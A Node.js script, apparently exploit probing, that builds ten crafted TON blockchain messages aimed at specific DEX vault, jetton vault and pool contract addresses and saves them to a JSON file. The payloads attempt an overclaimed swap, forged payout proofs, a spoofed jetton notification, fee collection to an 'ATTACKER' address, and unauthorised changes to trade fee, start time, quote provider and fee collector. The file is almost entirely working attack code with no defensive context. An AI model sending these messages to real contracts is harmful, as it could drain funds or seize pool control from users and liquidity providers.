const { Address, beginCell, internal, storeMessage, toNano } = require('@ton/core');
const fs = require('fs');
const VAULTN = Address.parse('EQDa4VOnTYlLvDJ0gZjNYm5PXfSmmtL6Vs6A_CZEtXCNICq_');
const JVAULT_USDT = Address.parse('EQAYqo4u7VF0fa4DPAebk4g9lBytj2VFny7pzXR0trjtXQaO');
const FACTORY = Address.parse('EQBfBWT7X2BHg9tXAxzhz2aKiNTU1tpt5NsiK0uSDW_YAJ67');
const USDT = Address.parse('EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs');
const POOL = Address.parse('EQA-X_yo3fzzbDbJ_0bzFWKqtRuZFIRa1sJsveZJ1YpViO3r');
const ATTACKER = new Address(0, Buffer.alloc(32,0x11)).toString();
const ATTACKER_A = Address.parse(ATTACKER);
const RECIP = Address.parse(ATTACKER);
function swapParamsCell(secs){ return beginCell().storeUint(Math.floor(Date.now()/1000)+secs,32).storeAddress(null).storeAddress(null).storeBit(0).storeBit(0).endCell(); }
function proofCell(ct, paramsCell){ return beginCell().storeAddress(FACTORY).storeUint(ct,8).storeSlice(paramsCell.beginParse()).endCell(); }
const out = {};
function add(name, target, valueNano, body, srcAddr){ out[name] = {target: target.toString(), value: valueNano.toString(), body: body.toBoc().toString('hex'), src: (srcAddr||ATTACKER_A).toString()}; }

// P1 overclaim swap
add('p1_swap_overclaim', VAULTN, '300000000', beginCell().storeUint(0xea06185d,32).storeUint(1n,64).storeCoins(1000n*10n**9n).storeAddress(POOL).storeUint(0,1).storeCoins(0n).storeBit(0).storeRef(swapParamsCell(300)).endCell());
// P2 forge payout real pool proof
{
  const proof = proofCell(2, beginCell().storeBit(false).storeSlice(beginCell().storeUint(0,4).endCell().beginParse()).storeSlice(beginCell().storeUint(1,4).storeInt(0,8).storeBuffer(USDT.hash).endCell().beginParse()).endCell());
  add('p2_forge_payout_from_real_pool', VAULTN, '300000000', beginCell().storeUint(0xad4eb6f5,32).storeUint(2n,64).storeCoins(1000n*10n**9n).storeAddress(RECIP).storeBit(0).storeRef(proof).endCell());
}
// P3 forge payout fake pool
{
  const proof = proofCell(2, beginCell().storeBit(false).storeSlice(beginCell().storeUint(0,4).endCell().beginParse()).storeSlice(beginCell().storeUint(1,4).storeInt(0,8).storeBuffer(Buffer.alloc(32,0xAB)).endCell().beginParse()).endCell());
  add('p3_forge_payout_fake_pool', VAULTN, '300000000', beginCell().storeUint(0xad4eb6f5,32).storeUint(3n,64).storeCoins(1000n*10n**9n).storeAddress(RECIP).storeBit(0).storeRef(proof).endCell());
}
// P4 spoof jetton notify with swap forward payload
{
  const swapPayload = beginCell().storeUint(0xe3a0d482,32).storeAddress(POOL).storeUint(0,1).storeCoins(0n).storeBit(0).storeRef(swapParamsCell(300)).endCell();
  const notify = beginCell().storeUint(0x7362d09c,32).storeUint(4n,64).storeCoins(1000000n).storeAddress(RECIP).storeBit(1).storeRef(swapPayload).endCell();
  add('p4_spoof_jetton_notify_swap', JVAULT_USDT, '300000000', notify);
}
// P5 collect fees
add('p5_collect_fees_attacker', POOL, '300000000', beginCell().storeUint(0x0b429f52,32).storeUint(5n,64).storeCoins(10n**9n).storeAddress(RECIP).storeBit(0).storeCoins(10n**9n).storeAddress(RECIP).storeBit(0).endCell());
// P6 trade fee
add('p6_configure_trade_fee', POOL, '300000000', beginCell().storeUint(0xc015297f,32).storeUint(6n,64).storeUint(9999,16).endCell());
// P7 start time
add('p7_configure_start_time', POOL, '300000000', beginCell().storeUint(0x7ed7f6ce,32).storeUint(7n,64).storeUint(4102444800,32).endCell());
// P8 quote provider
add('p8_configure_quote_provider', POOL, '300000000', beginCell().storeUint(0xabb46b3d,32).storeUint(8n,64).storeUint(0,4).storeAddress(RECIP).endCell());
// P9 fee collector
add('p9_configure_fee_collector', POOL, '300000000', beginCell().storeUint(0xeda15922,32).storeUint(9n,64).storeAddress(RECIP).endCell());
// P10 payout direct to vault
add('p10_payout_direct', VAULTN, '300000000', beginCell().storeUint(0x474f86cf,32).storeUint(10n,64).storeBit(0).endCell());
fs.writeFileSync('probes2.json', JSON.stringify(out,null,1));
console.log(Object.keys(out).length, 'probes2 written');
